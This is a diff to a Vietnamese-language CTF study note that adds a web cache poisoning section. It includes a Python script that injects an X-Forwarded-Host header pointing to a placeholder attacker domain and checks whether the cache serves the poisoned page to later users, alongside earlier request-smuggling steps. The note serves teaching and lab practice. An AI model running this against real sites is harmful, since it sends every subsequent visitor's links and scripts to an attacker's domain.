@@ -75,6 +75,44 @@ python3 smuggler.py -u "http://target/"
 - Nếu `-m POST` không cho kết quả, thử lại với `-m GET` (`--method GET`) — endpoint một số app chỉ nhận GET.
 - Thấy dòng ghi `[VULNERABLE]` rồi mới áp dụng đúng kỹ thuật tương ứng (ví dụ CL.TE) vào script `socket` ở trên để tự tạo request giấu theo đúng mục tiêu bạn muốn (đọc `/admin/flag`...).
 
+## Cache Poisoning (cùng nguyên nhân gốc, hậu quả khác)
+
+Request Smuggling (ở trên) làm request ẩn ảnh hưởng tới **người dùng kế tiếp trên cùng 1 kết nối**. **Cache Poisoning** là hậu quả khác, nguy hiểm rộng hơn: nếu có 1 lớp CDN/cache đứng trước (lưu lại response để trả nhanh cho những lượt sau, không phải hỏi lại server thật mỗi lần), và bạn khiến nó **lưu nhầm 1 response độc vào cache**, thì **MỌI người** ghé trang đó sau bạn — không chỉ 1 người kế tiếp — đều nhận response độc đã bị lưu sẵn.
+
+Cách hay gặp nhất không cần tới kỹ thuật smuggling phức tạp ở trên: nhiều server tin vào 1 **header do chính bạn gửi lên** để tạo link tuyệt đối trong trang (ví dụ `X-Forwarded-Host` dùng để biết "domain thật" khi có proxy đứng trước), nhưng lớp cache lại **không tính header đó vào "chìa khoá" lưu cache** (gọi là unkeyed input — dữ liệu ảnh hưởng tới response nhưng cache không biết để phân biệt). Kết quả: bạn gửi 1 request với `X-Forwarded-Host` trỏ tới domain độc, server trả về trang có link trỏ sang domain độc đó, cache lưu lại response này dưới "chìa khoá" y hệt request bình thường — và phát lại response độc đó cho mọi người sau.
+
+```python
+import requests
+
+base = "http://target"
+s = requests.Session()
+s.verify = False
+
+def solve_one(session, base_url):
+    # Bước 1: gửi request với header X-Forwarded-Host trỏ domain do bạn kiểm soát (dùng domain giả định)
+    evil_host = "evil.attacker.test"
+    r = session.get(
+        f"{base_url}/",
+        headers={"X-Forwarded-Host": evil_host},
+        timeout=5,
+    )
+    # Nếu response có chứa domain giả ở link/script tag -- header này đang bị dùng để build URL
+    poisoned = evil_host in r.text
+    print("Header X-Forwarded-Host ảnh hưởng response:", poisoned)
+    if not poisoned:
+        return None
+
+    # Bước 2: gửi lại request BÌNH THƯỜNG (không có header lạ) -- xem cache có trả nhầm bản độc không
+    r2 = session.get(f"{base_url}/", timeout=5)
+    cached = evil_host in r2.text
+    print("Request thường (không header lạ) vẫn thấy domain độc -- CACHE ĐÃ BỊ ĐẦU ĐỘC:", cached)
+    return cached
+```
+
+- `headers={"X-Forwarded-Host": evil_host}` giả vờ là proxy đang nói với server thật "domain gốc người dùng gõ là `evil.attacker.test`" — nếu code server dùng giá trị này để tự build link (ví dụ link "reset password" gửi trong email, hoặc link `<script src="http://{host}/app.js">`), link sinh ra sẽ trỏ sang domain độc.
+- Request thứ 2 **không có header lạ nào** — mục đích là kiểm tra có phải response bị CACHE giữ lại (vẫn thấy `evil_host` dù request này hoàn toàn "sạch") hay không, khác với chỉ ảnh hưởng đúng request đang gửi (không có cache).
+- Nếu `cached=True`: xác nhận đầu độc cache thành công — mọi người dùng khác ghé trang chủ **sau thời điểm bạn gửi request bước 1** sẽ thấy link trỏ sang domain độc, tới khi cache tự hết hạn hoặc bị xoá.
+
 ## Lưu ý nhanh
 
 - Nếu không chắc chắn có 2 lớp server, dùng kỹ thuật dò an toàn bằng đo thời gian (timing-based) trước khi gửi payload "nguy hiểm" — tool `smuggler` ở `~/hoc/CTF/Tools/web/smuggler/` tự quét hàng chục biến thể mà không ảnh hưởng ai.
